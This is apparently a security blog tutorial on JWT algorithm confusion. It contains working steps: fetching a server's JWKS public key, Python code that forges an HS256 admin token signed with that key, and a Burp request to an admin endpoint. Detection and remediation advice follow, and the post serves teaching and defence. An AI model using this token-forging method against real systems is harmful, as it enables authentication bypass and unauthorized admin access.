---
title: "JWT Algorithm Confusion: From RS256 to HS256"
date: "2026-04-10"
thumbnail: "/assets/img/thumbnail/post-jwt-algorithm-confusion.png"
tags:
    - web
    - jwt
    - authentication
    - api
---

## What Is Algorithm Confusion?

JWT algorithm confusion (also called key confusion) is a vulnerability where a server accepts tokens signed with a different algorithm than intended — specifically, signing an RS256 token (asymmetric, uses a private key) with HS256 (symmetric, uses a shared secret).

The exploit: if you can trick the server into verifying your HS256 token using the **public key** as the HMAC secret, you can forge arbitrary tokens.

---

## How RSA-Based JWT Works

With RS256:
- **Server signs** tokens with its **private key**
- **Server verifies** tokens using its **public key**
- The public key is often exposed at `/jwks.json` or `/.well-known/jwks.json`

With HS256:
- Same key is used to sign **and** verify
- If a library sees `"alg": "HS256"` and falls back to using the configured RSA public key as the HMAC secret — you win

---

## Step 1 — Recon

First, grab the public key. Most apps expose it:

```bash
curl https://target.com/.well-known/jwks.json
```

```json
{
  "keys": [{
    "kty": "RSA",
    "n": "syfV3K...",
    "e": "AQAB",
    "kid": "main"
  }]
}
```

Convert it to PEM format using a JWKS-to-PEM tool or python-jwt:

```python
from jwt.algorithms import RSAAlgorithm
import json

jwks = { "kty": "RSA", "n": "syfV3K...", "e": "AQAB" }
public_key = RSAAlgorithm.from_jwk(json.dumps(jwks))
print(public_key.public_bytes(...))  # save as public.pem
```

---

## Step 2 — Forge the Token

Create a token with `"alg": "HS256"`, signing it with the **RSA public key** as the HMAC secret:

```python
import jwt

with open("public.pem", "rb") as f:
    public_key = f.read()

payload = {
    "sub": "1",
    "role": "admin",
    "iat": 1714000000,
    "exp": 9999999999
}

token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

---

## Step 3 — Send It

Replace your JWT in Burp Repeater with the forged token:

```http
GET /api/v1/admin/users HTTP/1.1
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
```

If the server's JWT library doesn't enforce algorithm restriction and accepts the alg from the token header, the verification succeeds — it computes `HMAC-SHA256(header.payload, public_key)` and it matches what you signed with.

---

## Conditions Required

This works when:
1. The server's JWT library reads `alg` from the **token header** rather than enforcing an expected algorithm
2. The public key is obtainable (JWKS endpoint, JS source, response headers)
3. The library uses the same key object for both RSA verification and HMAC — which was common in older versions of `python-jose`, `node-jsonwebtoken`, and others

---

## Detection

In Burp, decode any JWT you receive (use the JWT Editor extension). Check:
- What algorithm is in the header?
- Does the app expose a JWKS endpoint?
- What happens when you change `alg` to `none`?
- What happens when you change `alg` to `HS256` and sign with the public key?

---

## Remediation

- Explicitly specify the allowed algorithm server-side — never trust the header's `alg`
- Use up-to-date JWT libraries (most have patched this)
- Validate `kid` against a whitelist of known keys

---

## References

- [PortSwigger JWT attacks](https://portswigger.net/web-security/jwt)
- CVE-2015-9235 (node-jsonwebtoken)
- [RFC 8725](https://www.rfc-editor.org/rfc/rfc8725) — JWT Best Current Practices
